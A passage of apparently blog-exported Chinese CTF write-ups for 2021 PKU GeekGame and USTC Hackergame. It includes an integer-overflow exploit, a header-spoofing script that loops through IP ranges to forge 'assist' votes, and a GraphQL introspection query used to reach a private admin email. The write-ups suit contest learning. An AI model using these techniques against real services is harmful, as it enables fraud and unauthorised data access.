&lt;= tx &lt; HEIGHT and 0 &lt;= ty &lt; WIDTH: count += board[tx][ty] return count def show_board(board): for i in range(HEIGHT): for j in range(WIDTH): if board[i][j]: print(\"*\", end='') else: print(near_count(board, i, j), end='') print() def run(easy_mode): signal.alarm(600) count = 0 while True: board = gen_board() count += 1 marks = [[False] * WIDTH for _ in range(HEIGHT)] steps = 0 print(\"New Game!\") while not check_win(board, marks): x, y = input(\"&gt; \").split() x, y = int(x), int(y) if board[x][y] != 0: if easy_mode and steps == 0: while board[x][y] != 0: board = gen_board() else: print(\"BOOM!\") show_board(board) break marks[x][y] = True print(near_count(board, x, y)) steps += 1 else: # win print(\"You win the game in %d steps!\" % steps) show_flag(easy_mode) break if count &gt;= ROUND_LIMIT: break print() t = input(\"try again? (y/n)\") if t != 'y': print(\"bye\") break if __name__ == \"__main__\": print(\"Welcome to the minesweeper game!\") t = input(\"easy mode? (y/n)\") easy_mode = t == 'y' run(easy_mode) 大概思路就是，先尽可能失败一堆，拿到整个棋盘，然后据此算出原始的随机数。通过 python 随机数机制推断出下一次的棋盘，再去解扫雷就完事了 （由于这题是最后一天凌晨看的，当天白天还有其他比赛，这个还要写交互，于是摸了.jpg 看看 Python 的随机数机制。 几乎所有模块函数都依赖于基本函数 random() ，它在半开放区间 [0.0,1.0) 内均匀生成随机浮点数。 Python 使用 Mersenne Twister 作为核心生成器。 它产生 53 位精度浮点数，周期为 2**19937-1 ，其在 C 中的底层实现既快又线程安全。 Mersenne Twister 是现存最广泛测试的随机数发生器之一。 但是，因为完全确定性，它不适用于所有目的，并且完全不适合加密目的。 random.getrandbits(k) 返回具有 k 个随机比特位的非负 Python 整数。 此方法随 MersenneTwister 生成器一起提供，其他一些生成器也可能将其作为 API 的可选部分提供。 在可能的情况下，getrandbits() 会启用 randrange() 来处理任意大的区间。 在 3.9 版更改: 此方法现在接受零作为 k 的值。 via https://docs.python.org/zh-cn/3/library/random.html （后面再来复现吧，理论上拿个现成的库预测一下就行吧 小结好难啊，太顶了吧！ 最后拿了 39 名，拿了个一血，摸了。 感觉题目挺绕的挺套的，一道题做一天，不对，是从第一天看到最后一天也没做出来…… 比如说 Flag即服务 那题本来第二问拿了个二血（没抢到一血哭哭），于是想抢第三问一血的，结果到了最后一天发现其他问题都解决了，就卡在带有过滤的有限长度的代码执行上了，害，其实就是 jsfuck 没好好优化啦（（（别骂了 本届竞赛将继续追求 题目新颖有趣、难度具有梯度，让没有相关经验的新生和具有一定专业基础的学生都能享受比赛，在学习的过程中有所收获。 题目里面还埋了挺多梗，但感觉难度梯度有点大，容易劝退，而且这打起来太花时间太折腾喵喵啦，每次看着以为马上出结果总有下一层等着你。 不过话说回来，题目套的点比较多，从学习的角度而言看 writeup 来学习的话收获还是不少的，Orz！ （u1s1，打这个比赛太累了 相关资源 比赛平台： https://geekgame.pku.edu.cn/ 官方资料存档及题解 repo： 1st PKU GeekGame taoky’s GeekGame v1 (2021) writeups etc. （溜了溜了喵~","path":"2021/11/25/CTF_2021PKUGeekGame/"},{"title":"CTF | 2021 USTC Hackergame WriteUp","text":"（不知道放什么图好，那就找张海报当题图吧） 前言 中国科学技术大学第八届信息安全大赛 比赛时间： 北京时间 2021 年 10 月 23 日 中午 12:00 ～ 10 月 30 日 中午 12:00（共七天）；添加到日历 为了让参赛的同学们更好地平衡学习和比赛，按照传统，我们将于 10 月 24 日（周日）晚 20:00 至 10 月 25 日（周一）早 8:00 期间关闭比赛平台。在此期间选手们可以好好休息，完成自己的作业，准备迎接新的一周。 赛制： 个人线上赛，解题模式，约 25 道题目，有实时排行榜。 比赛题目分为 4 类，分类如下： 综合技能（general） 程序逆向与漏洞利用（binary） 密码学与数学（math） 网站安全（web） https://hack.lug.ustc.edu.cn/ 一年一度的 USTC Hackergame 又来了喵！ 顺便，喵喵 Hackergame 2020 的 Writeup 详见： CTF | 2020 USTC Hackergame WriteUp 这次比赛大部分题目的题解是边做边写的，所以与其说是题解，不如说是 解题的过程记录，你可以认为这篇博客里是一堆废话，里面 可能包含了错误或者有可能误导正确解题的内容，这太正常了 hhh。 由于最近比较忙，本来还想复现几道题再发博客的，发现一不小心咕了，想想还是算了，直接发出来吧。（摊手.jpg 后面可能还会陆续复现更新，大概可能估计吧，毕竟题目出得还是很不错的~ 签到 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！ 提示：完成题目遇到困难？你可以参考 2018 年签到题题解、2019 年签到题题解 和 2020 年签到题题解。 http://202.38.93.111:10000/?token=xxxxxxx 是去年那个 FLAG 提取器 的背景！（跑 试了一下，很明显这个参数 page 就是时间戳啦~ 比如现在的话就访问 http://202.38.93.111:10000/?page=1634984522 完事了。 进制十六——参上 为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。 而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。 好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。 只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣…… 直接 OCR 大法，然后 hex 转 ASCII 完事。 flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT} 去吧！追寻自由的电波 （前情提要） 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。 当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。 考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。 为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？ 注：flag 花括号内只包含小写字母。 先放慢一丢丢，然后对照 无线电中的英语字母读法 可以得到是 flag{phoneticab} 卖瓜 有一个人前来买瓜。 HQ：哥们，这瓜多少钱一斤啊？ 你：两块钱一斤。 HQ：What’s up！这瓜皮子是金子做的还是瓜粒子是金子做的？ 你：你瞧瞧现在哪有瓜啊？这都是大棚的瓜，只有 6 斤一个和 9 斤一个的，你嫌贵我还嫌贵呢。 （HQ 心里默默一算） HQ：给我来 20 斤的瓜。 你：行！ HQ：行？这瓜能称出 20 斤吗？ 你：我开水果摊的，还不会称重？ HQ：我问你这瓜能称出 20 斤吗？ 你：你是故意找茬，是不是？你要不要吧！ HQ：你这瓜要是刚好 20 斤吗我肯定要啊。那它要是没有怎么办啊？ 你：要是不是 20 斤，我自己吃了它，满意了吧？ （你开始选瓜称重） 补充说明：当称的数字变为浮点数而不是整数时，HQ 不会认可最终的称重结果。 http://202.38.93.111:15003/ 进行一个🍉的卖。 （测试工程师走进了这家瓜铺，）尝试构造个负数 操作无效：不能放负数个瓜。 1.5个6 斤 -&gt; 6斤 整个超级大的数，多来几次，嗯，溢出啦！ 重新开始，单独放6斤的瓜 18446744073709551615（0xFFFFFFFFFFFFFFFF，64位全1）个，得到0个； 单独放9斤这么多个 -&gt; -9223372036854775808 斤，也就是 -0x8000000000000000 然后不管了，反正先用个负数，然后再加回去到正的20就完事了，注意一下要 x6 或者 x9 而且不要溢出。 比如先放 1537228672809129301个 9斤的 电子秤上已有 -4611686018427387904/20 斤的瓜。 然后放 4611686018427387904//6 == 768614336404564650 个 6 斤的，得到 -4 斤。 最后再放 4 个 6 斤的完事。 猫咪问答 Pro Max 我猛然一看，就猛然看到这个猫咪问答，我直呼我直呼，上次看到这么这么的发言还是上次，这问答属于是典型的典型了，我之前还没发现，当我发现的时候我已经发现了，这问答就像一个问答，问答的内容充满了内容，我不禁感慨了一句感慨：希望下次看到这么这么的猫咪问答是下次。 提示：解出谜题不需要是科大在校学生。解题遇到困难？你可以参考 2018 年猫咪问答题解 和 2020 年猫咪问答++ 题解。 20190928 http://ftp.lug.ustc.edu.cn/%E7%A4%BE%E5%9B%A2%E7%AE%A1%E7%90%86/%E7%AB%A0%E7%A8%8B/ https://lug.ustc.edu.cn/wiki/lug/events/ 试了 20201024 也不对，看这个 slide 里面貌似也有投票的。（ 再看题目，他问的是 信息安全俱乐部的社团章程 啊，那应该是2017年之前的了。。 那既然给了域名，直接去 webarchive 找吧。 https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes 5 为了表彰其出色表现，协会于 2011 年 5 月被评为中国科学技术大学优秀学生社团，于 2012 年 5 月、2013 年 5 月及 2014 年 5 月分别被评为中国科学技术大学四星级学生社团，并于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月及 2020 年 9 月被评为中国科学技术大学五星级学生社团。 via https://lug.ustc.edu.cn/wiki/intro/ 然而发现试了4不对，看来今年也有吧 （不及时更新害人不浅啊 这个还是有点难找的，其实吧，喵喵先是翻 tg 找到了这张图（跑 然后咕咕噜搜到啦（ Development Team of Library 13 可以找到这篇论文 http://sigbovik.org/2021/ http://sigbovik.org/2021/proceedings.pdf 然后后面他举了13个数据集的例子，13张图…… /dev/null https://datatracker.ietf.org/doc/rfc8962/ 完事（ 透明的文件 一个透明的文件，用于在终端中展示一个五颜六色的 flag。 可能是在 cmd.exe 等劣质终端中被长期使用的原因，这个文件失去了一些重要成分，变成了一堆乱码，也不会再显示出 flag 了。 注意：flag 内部的字符全部为小写字母。 给的文件大概长这样…… [0;0H[20;58H[8;34H[13;27H[4;2H[38;2;1;204;177m [39m[14;10H[20;51H[23;4H[12;2H[38;2;2;207;173m [39m[19;61H[9;12H[22;8H[20;2H[38;2;3;210;169m [39m[3;23H[8;68H[19;10H[4;3H[38;2;4;214;165m [39m[19;23H[17;34H[11;52H[22;70H[12;3H[38;2;5;217;161m [39m[24;22H[2;25H[19;76H[19;3H[38;2;6;220;157m [39m[23;14H[21;12H[10;37H[2;37H[22;66H[16;45H[21;3H[38;2;7;222;153m 很明显是 shell 的转义序列，然后 垃圾 cmd 显示不出来锅了。 参考 Bash tips: Colors and formatting (ANSI/VT100 Control sequences) 或者看 TaQini 师傅的 设置终端输出字符的属性（颜色+格式+超链接） 可以知道 \\033[y;xH 用来设置光标位置，那其实就相当于鼠标画图了（老考点了 那就依次提取出各个点，画个图连一起就好了。 画出来发现这是啥啊…… 其实只有每一行（即原始数据的空格之前）的最后一个坐标有用啦。 然后摸了，直接替换文件把最后的颜色输出个字符出来算了（跑 先加个 ESC 的转义字符 \\033，然后最后随便加个字符。 （当然你用 sed 也行 echo -e `cat transparent_fix.txt` 全小写字母 flag{abxnniohkalmcowsayfiglet} 旅行照片 你的学长决定来一场说走就走的旅行。通过他发给你的照片来看，他应该是在酒店住下了。 从照片来看，酒店似乎在小区的一栋高楼里，附近还有一家 KFC 分店。突然，你意识到照片里透露出来的信息比表面上看起来的要多。 请观察照片并答对全部 5 道题以获取 flag。注意：图片未在其他地方公开发布过，也未采取任何隐写措施（通过手机拍摄屏幕亦可答题）。 是图片社工大手子啊（怎么你们都会做啊 很明显这个是在海边，看起来是面朝偏南方向，阳光从右往左照，那应该是从西边照过来。当前就是傍晚了。 这个肯德基蓝色的很有特征，咕咕噜一搜，找到了小红书的一个笔记，啊，不就是这个嘛。 秦皇岛新奥海地世界，很好。 百度地图 搜一波，就你了。拍摄的角度如图所示。 肯德基号码 0335-7168800 百度这个实景地图还是老的啊，不过也能看出是 海豚馆 了。 楼层的话，根据对面的楼，这个拍的不超过15楼，再考虑到拍摄角度偏下，俯拍的感觉，应该也在这个附近了。最后试了发现就是14F。 完事。 有意思的是，题目的答案是通过将选项内容序列化之后请求后端的一个文件来得到的。 http://202.38.93.111:10055/MT1iJjI9ZSYzPTE0JjQ9MDMzNS03MTY4ODAwJjU9JUU2JUI1JUI3JUU4JUIxJTlBJUU5JUE2JTg2.txt FLAG 助力大红包 “听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！” “还有这么好的事情？我也要参加！” “快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。” “那怎么才能参加呢？” “这还不简单！点击下面的链接就行” 公告：本题在小概率情况下会产生操作时间限制无法重置的现象，表现为一直显示“操作速度太快了，请稍后再试！”，现已修复，请大家重新点击按钮后稍等几秒钟即可恢复。 啊，是拼夕夕 又是可恶的砍价！噢不对，是集 flag！ 前端会调用 https://pv.sohu.com/cityjson?ie=utf-8 这个接口获取IP，后端比对是否相符，如果相符则可助力成功。 然后发现咱校 IP 出口分流策略不一样，导致前后端结果不一致（ 不过发现直接加个 X-Forwarded-For 头就好了。 接下来就是遍历 /8 段，依次发包就完事了。 import time import requests url = \"http://202.38.93.111:10888/invite/a7009a3c-6bd0-4674-8586-e36a9b4b7e58\" for i in range(256): ip = f'{i}.1.1.1' data = \"ip=\" + ip headers = { \"X-Forwarded-For\": ip, \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0\", \"Content-Type\": \"application/x-www-form-urlencoded\" } r = requests.post(url, headers=headers, data=data) # print(r.status_code) # print(r.text) if \"助力成功\" in r.text: print(i, 'OK') time.sleep(1.25) 注意不能太快，不然会无效。 等到跑完就能提现了。 flag{r3d-enve10p3-bf6a7f44ac} （要是拼夕夕也能这么刷就好了 Amnesia 你的程序只需要输出字符串 Hello, world!（结尾有无换行均可）并正常结束。 编译指令：gcc -O file.c -m32 运行指令：./a.out 编译器版本：Docker 镜像 ustclug/debian:10 中 apt update &amp;&amp; apt -y upgrade &amp;&amp; apt install -y gcc=4:8.3.0-1 gcc-multilib=4:8.3.0-1 的版本 轻度失忆 编译后 ELF 文件的 .data 和 .rodata 段会被清零。 连接题目：nc 202.38.93.111 10051 或网页终端 判题脚本：下载 记忆清除 编译后 ELF 文件的 .text 段会被清零。 连接题目：nc 202.38.93.111 10061 或网页终端 判题脚本：下载 轻度失忆 linux 目标文件(*.o) bss,data,text,rodata,堆,栈 数据段（BSS段、DATA段）、代码段（.RODATA）、堆栈段的区别 volatile关键字通常用来修饰多线程共享的全局变量和IO内存。告诉编译器，不要把此类变量优化到寄存器中，每次都要老老实实的从内存中读取，因为它们随时都可能变化。这个关键字可能比较生僻，但千万不要忘了它，否则一个错误让你调试好几天也得不到一点线索。 （注：这个相当于stm32文件中定义的__IO，代表了每次读取用这个关键词定义的值的时候，需要去内存中实时的读取。也就是说每次得到的都是最新的值） 整个 volatile 试试吧（好久没写C了啊 #include &lt;stdio.h&gt; int main() { volatile char *x = \"Hello, world!\"; puts(x); return 0; } 虽然 puts 函数中变量定义的类型是 const char *，会报 warning，但不影响正常输出呀（跑 要是换成用数组，一个一个元素赋值应该就不会有这个问题。 再或者，一个一个字符 putchar 也行。 图之上的信息 小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。 你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？ u1s1 第一次用 GraphQL，虽然早就知道 GitHub 新版 API（好像是 v4？）是基于这个进行查询的了。 这题是个笔记阅读系统，guest 登录进去，有个 /graphql 接口请求后端。 参考 当CTF遇上GraphQL的那些事 先 dump 一下所有对象和字段，通过 IntrospectionQuery 来返回足够多信息。 query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}} or query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description args{...InputValue}onOperation onFragment onField}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name}}}} 得到 {\"data\":{\"__schema\":{\"queryType\":{\"name\":\"Query\"},\"mutationType\":null,\"subscriptionType\":null,\"types\":[{\"kind\":\"OBJECT\",\"name\":\"Query\",\"description\":null,\"fields\":[{\"name\":\"note\",\"description\":\"Get a specific note information\",\"args\":[{\"name\":\"id\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"notes\",\"description\":\"Get notes information of a user\",\"args\":[{\"name\":\"userId\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"user\",\"description\":\"Get a specific user information\",\"args\":[{\"name\":\"id\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"defaultValue\":\"null\"}],\"type\":{\"kind\":\"OBJECT\",\"name\":\"GUser\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"GNote\",\"description\":null,\"fields\":[{\"name\":\"id\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"contents\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"Int\",\"description\":\"The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"String\",\"description\":\"The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"GUser\",\"description\":null,\"fields\":[{\"name\":\"id\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"Int\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"username\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"privateEmail\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"description\":\"The `Boolean` scalar type represents `true` or `false`.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Schema\",\"description\":\"A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.\",\"fields\":[{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"types\",\"description\":\"A list of all types supported by this server.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"queryType\",\"description\":\"The type that query operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"mutationType\",\"description\":\"If this server supports mutation, the type that mutation operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"subscriptionType\",\"description\":\"If this server support subscription, the type that subscription operations will be rooted at.\",\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"directives\",\"description\":\"A list of all directives supported by this server.\",\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Directive\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"description\":\"The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\\n\\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.\",\"fields\":[{\"name\":\"kind\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"ENUM\",\"name\":\"__TypeKind\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"specifiedByUrl\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"fields\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Field\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"interfaces\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"possibleTypes\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"enumValues\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__EnumValue\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"inputFields\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ofType\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"ENUM\",\"name\":\"__TypeKind\",\"description\":\"An enum describing what kind of type a given `__Type` is.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":[{\"name\":\"SCALAR\",\"description\":\"Indicates this type is a scalar.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"OBJECT\",\"description\":\"Indicates this type is an object. `fields` and `interfaces` are valid fields.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INTERFACE\",\"description\":\"Indicates this type is an interface. `fields`, `interfaces`, and `possibleTypes` are valid fields.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"UNION\",\"description\":\"Indicates this type is a union. `possibleTypes` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM\",\"description\":\"Indicates this type is an enum. `enumValues` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_OBJECT\",\"description\":\"Indicates this type is an input object. `inputFields` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"LIST\",\"description\":\"Indicates this type is a list. `ofType` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"NON_NULL\",\"description\":\"Indicates this type is a non-null. `ofType` is a valid field.\",\"isDeprecated\":false,\"deprecationReason\":null}],\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Field\",\"description\":\"Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"args\",\"description\":null,\"args\":[{\"name\":\"includeDeprecated\",\"description\":null,\"type\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null},\"defaultValue\":\"false\"}],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"type\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"description\":\"Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default 